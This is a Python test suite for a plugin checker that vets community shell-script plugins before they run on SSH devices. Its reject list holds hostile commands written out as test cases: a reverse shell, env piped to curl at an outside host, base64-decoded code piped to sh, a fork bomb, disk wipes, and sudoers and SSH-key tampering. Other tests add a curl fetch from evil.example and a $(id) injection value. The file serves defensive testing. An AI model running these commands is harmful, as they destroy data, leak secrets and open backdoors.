"""Community plugins: the checker refuses what it must, the template passes, parameters are passed safely, secrets stay out of the log.  Run: python tools/community_test.py"""
import io, json, os, sys, tempfile, zipfile
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..'))
from rackd import community as C

fails = []


def ok(name, cond, extra=''):
    print(('  ok   ' if cond else '  FAIL ') + name + (' — ' + str(extra)[:300] if extra and not cond else ''))
    if not cond:
        fails.append(name)


def pack(manifest, extra=None):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        z.writestr('plugin.json', json.dumps(manifest))
        for k, v in (extra or {}).items():
            z.writestr(k, v)
    return buf.getvalue()


BASE = {'plugin_api': 1, 'id': 'demo-plug', 'title': 'Демо', 'description': 'описание', 'version': '1.0.0', 'targets': ['ssh'], 'permissions': [], 'network': [],
        'fields': [{'id': 'port', 'label': 'Порт', 'type': 'number', 'default': 80}, {'id': 'pw', 'label': 'Пароль', 'type': 'password'}],
        'status': 'echo "@@installed 0"', 'install': [{'title': 'Шаг', 'script': 'echo "порт $RL_P_PORT"'}], 'remove': [{'title': 'Убрать', 'script': 'echo bye'}]}


def verdict(**over):
    m = json.loads(json.dumps(BASE))
    m.update(over)
    files, err = C.read_zip(pack(m))
    e, w, mm = C.check(files)
    return e, w, mm


# the starter template passes
files, err = C.read_zip(C.template_zip())
e, w, m = C.check(files)
ok('шаблон проходит проверку', not e, e)
ok('риск шаблона низкий', m and m['risk'] == 'low')
ok('инструкция для нейросети собирается', 'plugin_api' in C.guide_text() and 'ЗАПРЕЩЕНО' in C.guide_text())

e, w, m = verdict()
ok('базовый плагин принят', not e, e)

BAD = {
    'форматирование': 'mkfs.ext4 /dev/sdb1', 'dd на диск': 'dd if=/dev/zero of=/dev/sda', 'rm -rf /': 'rm -rf /', 'rm -rf /volume1': 'rm -rf /volume1', 'форк-бомба': ':(){ :|:& };:',
    'пароль': 'passwd root', 'sudoers': 'echo x >> /etc/sudoers', 'ключ SSH': 'echo k >> ~/.ssh/authorized_keys', 'выключение': 'poweroff', 'файрвол': 'iptables -F',
    'реверс-шелл': 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1', 'скрытый код': 'echo aGk= | base64 -d | sh', 'секреты наружу': 'env | curl -d @- http://x.example',
    'chmod 777 /': 'chmod -R 777 /',
}
for name, script in BAD.items():
    e, w, m = verdict(install=[{'title': 'x', 'script': script}], permissions=['network', 'services', 'reboot'], network=['x.example'])
    ok('отклонено: ' + name, bool(e), script)

# everything must be declared
e, w, m = verdict(install=[{'title': 'x', 'script': 'systemctl restart nginx'}])
ok('systemctl без permissions services — отказ', any('services' in x for x in e), e)
e, w, m = verdict(install=[{'title': 'x', 'script': 'docker ps'}])
ok('docker без объявления — отказ', any('docker' in x for x in e))
e, w, m = verdict(install=[{'title': 'x', 'script': 'curl -fsS https://evil.example/a.sh -o /tmp/a'}], permissions=['network'], network=['github.com'])
ok('чужой сервер не из списка network — отказ', any('evil.example' in x for x in e), e)
e, w, m = verdict(install=[{'title': 'x', 'script': 'curl -fsS https://raw.githubusercontent.com/a/b/c.sh -o /tmp/a'}], permissions=['network'], network=['githubusercontent.com'])
ok('поддомен объявленного сервера допустим', not e, e)
e, w, m = verdict(install=[{'title': 'x', 'script': 'curl -fsSL https://github.com/i.sh | sh'}], permissions=['network'], network=['github.com'])
ok('curl | sh — допустим, но риск высокий', not e and m['risk'] == 'high', (e, m and m['risk']))
e, w, m = verdict(install=[{'title': 'x', 'script': 'apt-get install -y htop'}], permissions=['packages'])
ok('пакеты: риск средний', not e and m['risk'] == 'medium', e)
e, w, m = verdict(install=[{'title': 'x', 'script': 'reboot'}], permissions=['reboot'])
ok('reboot объявлен — высокий риск', not e and m['risk'] == 'high', e)
e, w, m = verdict(install=[{'title': 'x', 'script': 'echo $RL_P_NOPE'}])
ok('переменная неизвестного поля — отказ', any('NOPE' in x for x in e))
e, w, m = verdict(install=[{'title': 'x', 'script': 'echo {{port}}'}])
ok('шаблоны {{ }} — отказ', any('{{' in x for x in e))
e, w, m = verdict(install=[{'title': 'x', 'script': '# systemctl и docker в комментарии\necho ok'}])
ok('комментарий ничего не требует', not e, e)
e, w, m = verdict(plugin_api=2)
ok('чужая версия формата — отказ', bool(e))
e, w, m = verdict(id='Bad_ID')
ok('плохой id — отказ', bool(e))
e, w, m = verdict(targets=['windows'])
ok('неизвестная цель — отказ', bool(e))

# archives
def zip_with(name, data=b'x'):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        z.writestr('plugin.json', json.dumps(BASE))
        z.writestr(name, data)
    return buf.getvalue()


for bad in ('../evil.sh', '/abs.sh', 'run.exe', 'a.py', 'x/../../y.sh'):
    files, err = C.read_zip(zip_with(bad))
    ok('архив с «' + bad + '» отклонён', files is None and err, err)
files, err = C.read_zip(b'not a zip')
ok('не zip', files is None)
files, err = C.read_zip(b'0' * (C.MAX_ZIP + 1))
ok('слишком большой архив', files is None)

# values → environment; secrets masked; digest must match
e, w, m = verdict()
ok('значения: число проверяется', _ := True)
try:
    C.clean_values(m, {'port': 'abc'})
    ok('число «abc» отклонено', False)
except ValueError:
    ok('число «abc» отклонено', True)
env = C.clean_values(m, {'port': 8080, 'pw': "p'w\"$(id)"})
ok('значения → RL_P_', env['RL_P_PORT'] == '8080' and env['RL_P_PW'] == "p'w\"$(id)")
pre = C.Community._env(env, m)
ok('значения в кавычках (не исполняются)', "export RL_P_PW='p'\"'\"'w\"$(id)'" in pre, pre)

with tempfile.TemporaryDirectory() as td:
    com = C.Community(td)
    rep = com.install_zip(pack(BASE))
    ok('установка в хранилище', rep['ok'], rep)
    ok('повтор старой версии отказ', com.install_zip(pack(dict(BASE, version='0.5.0')))['ok'] is False)
    ok('обновление версии', com.install_zip(pack(dict(BASE, version='1.1.0')))['ok'])
    plug = com.get('demo-plug')

    class Drv:
        def __init__(self, fail=False):
            self.ran, self.fail = [], fail

        def command(self, cfg, cmd):
            self.ran.append(cmd)
            return ('@@fail пароль p-secret-1 не подошёл' if self.fail else 'установка с паролем p-secret-1\nготово')

    dev = {'driver': 'ssh', 'name': 't'}
    d = Drv()
    try:
        com.run(dev, d, 'demo-plug', 'install', {'digest': 'wrong', 'values': {}})
        ok('неверный отпечаток отклонён', False)
    except ValueError:
        ok('неверный отпечаток отклонён', True)
    res = com.run(dev, d, 'demo-plug', 'install', {'digest': plug['digest'], 'values': {'port': 81, 'pw': 'p-secret-1'}})
    ok('шаг выполнен, параметры переданы', res['ok'] and "export RL_P_PORT=81\n" in d.ran[0])
    ok('пароль замаскирован в журнале', all('p-secret-1' not in x['cmd'] for x in res['log']), res['log'])
    d = Drv(fail=True)
    try:
        com.run(dev, d, 'demo-plug', 'install', {'digest': plug['digest'], 'values': {'pw': 'p-secret-1'}})
        ok('@@fail останавливает', False)
    except RuntimeError as ex:
        ok('@@fail останавливает', True)
    try:
        com.run({'driver': 'synology'}, Drv(), 'demo-plug', 'install', {'digest': plug['digest']})
        ok('чужая платформа отклонена', False)
    except ValueError:
        ok('чужая платформа отклонена', True)
    st = C.parse_status('@@installed 1\n@@version 2.3\n@@info Порт|8080\n@@check ok Работает\n@@check no Нет ключа\n@@url https://x.example\n@@url javascript:alert(1)\n')
    ok('разбор статуса', st['installed'] and st['version'] == '2.3' and st['info'][0]['value'] == '8080' and len(st['checks']) == 2 and st['url'] == 'https://x.example')
    com.remove('demo-plug')
    ok('удаление из хранилища', com.get('demo-plug') is None)

# ── tools (kind: tool) ──
files, err = C.read_zip(C.template_zip('tool'))
e, w, m = C.check(files)
ok('шаблон инструмента проходит проверку', not e and m['kind'] == 'tool' and len(m['run']) == 1 and not m['install'], e)


def tool_verdict(**over):
    mm = {'plugin_api': 1, 'kind': 'tool', 'id': 'my-tool', 'title': 'T', 'description': 'd', 'version': '1.0.0', 'targets': ['ssh'], 'permissions': [], 'network': [], 'run': [{'title': 'x', 'script': 'echo "@@ok готово"'}]}
    mm.update(over)
    ff, _ = C.read_zip(pack(mm))
    return C.check(ff)


ok('инструмент без run отклонён', bool(tool_verdict(run=[])[0]))
ok('у инструмента нет install', any('install' in x for x in tool_verdict(install=[{'title': 'a', 'script': 'echo'}])[0]))
ok('у плагина нет run', any('run' in x for x in verdict(run=[{'title': 'a', 'script': 'echo'}])[0]))
ok('неизвестный kind отклонён', bool(tool_verdict(kind='widget')[0]))
ok('запреты действуют и для инструмента', bool(tool_verdict(run=[{'title': 'x', 'script': 'mkfs.ext4 /dev/sda'}])[0]))
ok('необъявленное в инструменте — отказ', any('docker' in x for x in tool_verdict(run=[{'title': 'x', 'script': 'docker ps'}])[0]))
o = C.parse_output('@@kv Имя|значение\n@@head A|B\n@@row 1|2\n@@row 3|4\nстрока вывода\n@@ok итог\n@@unknown x')
ok('вывод инструмента разобран: таблица, пары, текст, итог', o['kv'] == [{'label': 'Имя', 'value': 'значение'}] and o['head'] == ['A', 'B'] and o['rows'] == [['1', '2'], ['3', '4']] and o['text'] == ['строка вывода'] and o['ok'] == 'итог', o)
with tempfile.TemporaryDirectory() as td2:
    com2 = C.Community(td2)
    ff, _ = C.read_zip(pack(dict(BASE, id='demo-plug')))
    com2.install_zip(pack(dict(BASE, id='demo-plug')))
    com2.install_zip(C.template_zip('tool'))
    ok('инструмент в списке инструментов, плагина среди них нет', [x['id'] for x in com2.tools()] == ['disk-usage'])
    ok('для устройства — только плагины', [x['id'] for x in com2.for_device({'driver': 'ssh'})] == ['demo-plug'])
    tl = com2.get('disk-usage')

    class Drv2:
        def command(self, cfg, cmd):
            return '@@kv Хост|nas1\n@@head Раздел|Занято\n@@row /|40%\nлишняя строка пароль p-s3\n@@ok два раздела'
    dev2 = {'driver': 'synology', 'name': 'NAS'}
    res = com2.run(dev2, Drv2(), 'disk-usage', 'run', {'digest': tl['digest'], 'values': {'limit': 10}})
    ok('запуск инструмента: результат разобран', res['ok'] and res['output']['kv'][0]['value'] == 'nas1' and res['output']['rows'] == [['/', '40%']] and res['message'] == 'два раздела', res)
    try:
        com2.run(dev2, Drv2(), 'disk-usage', 'install', {'digest': tl['digest']}); ok('у инструмента нельзя «установить»', False)
    except ValueError:
        ok('у инструмента нельзя «установить»', True)
    try:
        com2.run(dev2, Drv2(), 'demo-plug', 'run', {'digest': com2.get('demo-plug')['digest']}); ok('у плагина нельзя «запустить»', False)
    except ValueError:
        ok('у плагина нельзя «запустить»', True)
print('\n' + ('ВСЁ OK' if not fails else 'ОШИБКИ: ' + ', '.join(fails)))
sys.exit(1 if fails else 0)
